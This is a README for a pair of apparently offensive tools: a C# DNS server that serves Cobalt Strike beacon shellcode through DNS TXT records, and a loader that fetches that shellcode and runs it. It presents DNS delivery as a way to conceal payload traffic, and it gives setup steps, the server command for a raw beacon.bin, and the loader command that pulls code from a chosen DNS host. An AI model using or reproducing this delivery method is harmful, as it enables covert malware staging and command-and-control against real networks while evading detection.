# DNSWho

Implement a dns server = SharpDNS.exe             
Implement a "client" = DnsLoader.exe               

Compared with the http protocol, the dns protocol has better concealment. Analogous to the dns beacon of cs, we can implement a dns server to transmit shellcode by ourselves. C# has an excellent third-party library [ARSoft.Tools.Net](https://www.nuget.org/packages/ARSoft.Tools.Net/). We can use it for dns query and self-built dns server.               

Create a new console project of .net4.0 and install ARSoft.Tools.Net. Because of the .net version problem, we need to install the lower version of ARSoft.Tools.Net.                                   
[`Install-Package ARSoft.Tools.Net -Version 1.8.2`](https://www.nuget.org/packages/ARSoft.Tools.Net/1.8.2)            


![image](https://user-images.githubusercontent.com/25066959/104516114-d1b0b500-55c1-11eb-8bb5-98e9437d8775.png)             

So generate a raw cs payload if you are smart you wont make it stageless because it will be way to big.                 

![image](https://user-images.githubusercontent.com/25066959/104516517-78955100-55c2-11eb-99ce-2d8a5daf6e9a.png)                       

Then spinup the DNS server and make sure that the length is the same in wireshark as the one displayed in the terminal. `SharpDNS.exe beacon.bin`                       
The output will look like the following:                

![image](https://user-images.githubusercontent.com/25066959/105061777-e4a30980-5a47-11eb-906f-cdc712b8ae01.png)            

![image](https://user-images.githubusercontent.com/25066959/104516603-a24e7800-55c2-11eb-9805-fc644b49b11b.png)                         

then simply catch it `DnsLoader.exe <DNS> <CDN> 2000`                   

Note that the txt parsing of dns cannot be transmitted too much at a time, and the 2000 used in my test so that there is no problem.                    

![image](https://user-images.githubusercontent.com/25066959/104516478-61eefa00-55c2-11eb-90fd-74655d9c47fe.png)                      

Tada...                   

![image](https://user-images.githubusercontent.com/25066959/104516815-f48f9900-55c2-11eb-8175-7df4d4bbaedf.png)            



-----

### Having Issues?     

If you get the following error this is because youre not running this on the same machine as your DNS. That is because svchost.exe listens to UDP53

![image](https://user-images.githubusercontent.com/25066959/104516892-1d179300-55c3-11eb-91e6-92c9c5aa2884.png)

Additionally dont try to change the port for the `DnsServer` because you cant:

![image](https://user-images.githubusercontent.com/25066959/104517202-9c0ccb80-55c3-11eb-895c-0d6ae9e45dd2.png)

![image](https://user-images.githubusercontent.com/25066959/104517231-ac24ab00-55c3-11eb-828e-7feb1e16d003.png)
